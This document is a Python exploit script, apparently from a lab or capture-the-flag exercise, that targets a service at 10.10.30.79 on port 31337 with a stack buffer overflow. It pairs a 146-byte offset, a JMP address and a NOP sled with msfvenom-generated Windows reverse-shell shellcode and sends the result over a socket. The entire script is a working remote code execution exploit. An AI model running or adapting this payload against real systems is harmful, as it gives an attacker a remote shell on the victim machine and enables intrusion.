import socket, time, sys

ip = "10.10.30.79"
port = 31337
timeout = 5

string = "A" * 146 # exact offset
string += "\xc3\x14\x04\x08" # JMP Address 080414C3
string += "\x90" * 16 # NOP sled

# Shellcode (msfvenom -p windows/shell_reverse_tcp LHOST=-redacted- LPORT=6666 -b '\x00\x0a' -f py -a x86 --platform Windows)

buf =  b""
buf += b"\xd9\xca\xbd\x4b\x46\xf7\xcb\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x52\x83\xeb\xfc\x31\x6b\x13\x03\x20"
buf += b"\x55\x15\x3e\x4a\xb1\x5b\xc1\xb2\x42\x3c\x4b\x57"
buf += b"\x73\x7c\x2f\x1c\x24\x4c\x3b\x70\xc9\x27\x69\x60"
buf += b"\x5a\x45\xa6\x87\xeb\xe0\x90\xa6\xec\x59\xe0\xa9"
buf += b"\x6e\xa0\x35\x09\x4e\x6b\x48\x48\x97\x96\xa1\x18"
buf += b"\x40\xdc\x14\x8c\xe5\xa8\xa4\x27\xb5\x3d\xad\xd4"
buf += b"\x0e\x3f\x9c\x4b\x04\x66\x3e\x6a\xc9\x12\x77\x74"
buf += b"\x0e\x1e\xc1\x0f\xe4\xd4\xd0\xd9\x34\x14\x7e\x24"
buf += b"\xf9\xe7\x7e\x61\x3e\x18\xf5\x9b\x3c\xa5\x0e\x58"
buf += b"\x3e\x71\x9a\x7a\x98\xf2\x3c\xa6\x18\xd6\xdb\x2d"
buf += b"\x16\x93\xa8\x69\x3b\x22\x7c\x02\x47\xaf\x83\xc4"
buf += b"\xc1\xeb\xa7\xc0\x8a\xa8\xc6\x51\x77\x1e\xf6\x81"
buf += b"\xd8\xff\x52\xca\xf5\x14\xef\x91\x91\xd9\xc2\x29"
buf += b"\x62\x76\x54\x5a\x50\xd9\xce\xf4\xd8\x92\xc8\x03"
buf += b"\x1e\x89\xad\x9b\xe1\x32\xce\xb2\x25\x66\x9e\xac"
buf += b"\x8c\x07\x75\x2c\x30\xd2\xda\x7c\x9e\x8d\x9a\x2c"
buf += b"\x5e\x7e\x73\x26\x51\xa1\x63\x49\xbb\xca\x0e\xb0"
buf += b"\x2c\xff\xc5\xbd\x9e\x97\xdb\xc1\xc4\x6d\x55\x27"
buf += b"\x92\x61\x33\xf0\x0b\x1b\x1e\x8a\xaa\xe4\xb4\xf7"
buf += b"\xed\x6f\x3b\x08\xa3\x87\x36\x1a\x54\x68\x0d\x40"
buf += b"\xf3\x77\xbb\xec\x9f\xea\x20\xec\xd6\x16\xff\xbb"
buf += b"\xbf\xe9\xf6\x29\x52\x53\xa1\x4f\xaf\x05\x8a\xcb"
buf += b"\x74\xf6\x15\xd2\xf9\x42\x32\xc4\xc7\x4b\x7e\xb0"
buf += b"\x97\x1d\x28\x6e\x5e\xf4\x9a\xd8\x08\xab\x74\x8c"
buf += b"\xcd\x87\x46\xca\xd1\xcd\x30\x32\x63\xb8\x04\x4d"
buf += b"\x4c\x2c\x81\x36\xb0\xcc\x6e\xed\x70\xfc\x24\xaf"
buf += b"\xd1\x95\xe0\x3a\x60\xf8\x12\x91\xa7\x05\x91\x13"
buf += b"\x58\xf2\x89\x56\x5d\xbe\x0d\x8b\x2f\xaf\xfb\xab"
buf += b"\x9c\xd0\x29"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.send(string + buf + '\r\n')
        s.recv(1024)
        s.close()
except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
